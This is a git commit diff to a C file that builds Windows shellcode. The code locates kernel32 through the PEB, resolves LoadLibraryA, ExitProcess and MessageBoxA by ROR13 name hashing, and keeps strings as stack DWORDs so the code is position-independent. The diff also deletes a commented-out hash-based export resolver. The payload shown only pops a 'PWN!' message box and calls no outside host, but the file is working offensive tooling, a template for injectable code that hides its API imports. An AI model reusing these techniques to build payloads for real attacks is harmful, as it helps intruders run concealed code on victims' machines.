0a4e253a210006b451d8d4076dcfd1ab56dfdabe
Uniqu3Ch1 <uniquechl@outlook.com>
2021-04-21 17:25:54 +0800

    Fix address problem.

--- Shellcode/shellcode.c
+++ Shellcode/shellcode.c
@@ -1,4 +1,4 @@
-#include <windows.h>
+﻿#include <windows.h>
 #include <winternl.h>
 #include "shellcode.h"
 
@@ -20,28 +20,28 @@ typedef HMODULE(WINAPI* LOADLIBRARYA)(LPCSTR);
 typedef NTSTATUS(WINAPI* LDRLOADDLL)(PWCHAR, ULONG, PUNICODE_STRING, PHANDLE);
 typedef int (WINAPI* MESSAGEBOXA)(HWND, LPSTR, LPSTR, UINT);
 
-struct KERNEL32
-{
-	PVOID BaseAddr;
-	WinAPIPtr WinExec;
-	WinAPIPtr ExitProcess;
+typedef struct _ADDRESS_TABLE
+{//TODO: 添加退出线程功能
+	PVOID        Kernel32_BaseAddr;
 	LOADLIBRARYA LoadLibraryA;
-};
+	WinAPIPtr    ExitProcess;
 
-struct USER32
-{
-	HMODULE BaseAddr;
-	WinAPIPtr MessageBoxA;
-};
-//#pragma data_seg(".text")
-DWORD user[] = { 0x72657375, 0x642e3233, 0x00006c6c };
-//#pragma data_seg(".text$mn")
-DWORD sz_String[] = { 0x214e5750, 0x00000000 };
-//#pragma data_seg(".text$mn")
-BYTE pMessage[] = { 'M','e','s','s','a','g','e','B','o','x','A' };
+	DWORD        sz_String[2];
+	DWORD        user[4];
+	
+	HMODULE      User32_BaseAddr;
+	WinAPIPtr    WinExec;
+	
+	
+	WinAPIPtr    MessageBoxA;
+
+
+}ADDRESS_TABLE;
+
+
+
 int EntryMain();
 HMODULE GetProcAddrByHash(PVOID LibBaseAddr, DWORD FnHash);
-//HMODULE GetProcAddressWithHash(DWORD dwModuleFunctionHash);
 void CreateShellCode();
 HMODULE GetKernel32Base();
 DWORD HashKey(char* key);
@@ -72,16 +72,21 @@ void CreateShellCode() {
 	CloseHandle(hFile);
 }
 
-int EntryMain() {
-	struct USER32 user32;
-	struct KERNEL32 kernel32;
-	kernel32.BaseAddr = GetKernel32Base();
-	kernel32.LoadLibraryA = GetProcAddrByHash(kernel32.BaseAddr, HASH_LoadLibraryA);
-	kernel32.ExitProcess = GetProcAddrByHash(kernel32.BaseAddr, HASH_ExitProcess);
-	user32.BaseAddr = kernel32.LoadLibraryA(user);
-	user32.MessageBoxA = GetProcAddrByHash(user32.BaseAddr, HASH_MessageBoxA);
-	user32.MessageBoxA(0, sz_String, 0, MB_OK);
-	kernel32.ExitProcess();
+// shellcode���߼�
+int EntryMain() { 
+	ADDRESS_TABLE Addrs;
+	Addrs.Kernel32_BaseAddr = GetKernel32Base();
+	Addrs.LoadLibraryA = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_LoadLibraryA);
+	Addrs.ExitProcess = GetProcAddrByHash(Addrs.Kernel32_BaseAddr, HASH_ExitProcess);
+	Addrs.user[0] = 0x72657375;
+	Addrs.user[1] = 0x642e3233;
+	Addrs.user[2] = 0x00006c6c;
+	Addrs.User32_BaseAddr = Addrs.LoadLibraryA(Addrs.user);
+	Addrs.MessageBoxA = GetProcAddrByHash(Addrs.User32_BaseAddr, HASH_MessageBoxA);
+	Addrs.sz_String[0] = 0x214e5750;
+	Addrs.sz_String[1] = 0x00000000;
+	Addrs.MessageBoxA(0, Addrs.sz_String, 0, MB_OK);
+	Addrs.ExitProcess();
 	
 	
 
@@ -155,106 +160,7 @@ __forceinline DWORD HashKey(char* key)
 	}
 	return nHash;
 }
-/*
-HMODULE GetProcAddressWithHash(DWORD dwModuleFunctionHash)
-{
-	PPEB PebAddress;
-	PMY_PEB_LDR_DATA pLdr;
-	PMY_LDR_DATA_TABLE_ENTRY pDataTableEntry;
-	PVOID pModuleBase;
-	PIMAGE_NT_HEADERS pNTHeader;
-	DWORD dwExportDirRVA;
-	PIMAGE_EXPORT_DIRECTORY pExportDir;
-	PLIST_ENTRY pNextModule;
-	DWORD dwNumFunctions;
-	USHORT usOrdinalTableIndex;
-	PDWORD pdwFunctionNameBase;
-	PCSTR pFunctionName;
-	UNICODE_STRING BaseDllName;
-	DWORD dwModuleHash;
-	DWORD dwFunctionHash;
-	PCSTR pTempChar;
-	DWORD i;
 
-#if defined(_WIN64)
-	PebAddress = (PPEB)__readgsqword(0x60);
-#else
-	PebAddress = (PPEB)__readfsdword(0x30);
-#endif
-
-	pLdr = (PMY_PEB_LDR_DATA)PebAddress->Ldr;
-	pNextModule = pLdr->InLoadOrderModuleList.Flink;
-	pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pNextModule;
-
-	while (pDataTableEntry->DllBase != NULL)
-	{
-		dwModuleHash = 0;
-		pModuleBase = pDataTableEntry->DllBase;
-		BaseDllName = pDataTableEntry->BaseDllName;
-		pNTHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)pModuleBase + ((PIMAGE_DOS_HEADER)pModuleBase)->e_lfanew);
-		dwExportDirRVA = pNTHeader->OptionalHeader.DataDirectory[0].VirtualAddress;
-
-		// Get the next loaded module entry
-		pDataTableEntry = (PMY_LDR_DATA_TABLE_ENTRY)pDataTableEntry->InLoadOrderLinks.Flink;
-
-		// If the current module does not export any functions, move on to the next module.
-		if (dwExportDirRVA == 0)
-		{
-			continue;
-		}
-
-		// Calculate the module hash
-		for (i = 0; i < BaseDllName.MaximumLength; i++)
-		{
-			pTempChar = ((PCSTR)BaseDllName.Buffer + i);
-
-			dwModuleHash = ROTR32(dwModuleHash, 13);
-
-			if (*pTempChar >= 0x61)
-			{
-				dwModuleHash += *pTempChar - 0x20;
-			}
-			else
-			{
-				dwModuleHash += *pTempChar;
-			}
-		}
-
-		pExportDir = (PIMAGE_EXPORT_DIRECTORY)((ULONG_PTR)pModuleBase + dwExportDirRVA);
-
-		dwNumFunctions = pExportDir->NumberOfNames;
-		pdwFunctionNameBase = (PDWORD)((PCHAR)pModuleBase + pExportDir->AddressOfNames);
-
-		for (i = 0; i < dwNumFunctions; i++)
-		{
-			dwFunctionHash = 0;
-			pFunctionName = (PCSTR)(*pdwFunctionNameBase + (ULONG_PTR)pModuleBase);
-			pdwFunctionNameBase++;
-
-			pTempChar = pFunctionName;
-
-			do
-			{
-				dwFunctionHash = ROTR32(dwFunctionHash, 13);
-				dwFunctionHash += *pTempChar;
-				pTempChar++;
-			} while (*(pTempChar - 1) != 0);
-
-			dwFunctionHash += dwModuleHash;
-
-			if (dwFunctionHash == dwModuleFunctionHash)
-			{
-				usOrdinalTableIndex = *(PUSHORT)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfNameOrdinals) + (2 * i));
-				return (HMODULE)((ULONG_PTR)pModuleBase + *(PDWORD)(((ULONG_PTR)pModuleBase + pExportDir->AddressOfFunctions) + (4 * usOrdinalTableIndex)));
-			}
-		}
-	}
-
-	// All modules have been exhausted and the function was not found.
-	return NULL;
-}
-
-*/
 void ShellCodeEnd()
 {
 
